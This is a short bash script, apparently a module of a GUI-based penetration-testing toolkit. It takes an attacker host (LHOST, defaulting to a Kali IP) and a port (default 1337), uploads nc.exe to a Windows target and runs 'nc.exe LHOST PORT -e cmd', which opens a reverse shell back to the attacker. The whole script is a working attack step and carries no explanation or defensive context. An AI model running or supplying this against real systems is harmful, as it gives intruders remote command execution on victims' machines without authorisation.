#!/bin/bash

: '
upload nc.exe and start nc.exe and execute cmd
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${PORT_FIELD}"

LHOST=${form_data["lhost"]}
PORT=${form_data["port"]}

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="nc.exe"
EXECUTE_COMMAND="cmd"

cmd_upload_file "${LOCATION}" "${FILE}"

execute_command "${FILE_LOCATION} ${LHOST} ${PORT} -e ${EXECUTE_COMMAND}"
create_new_line
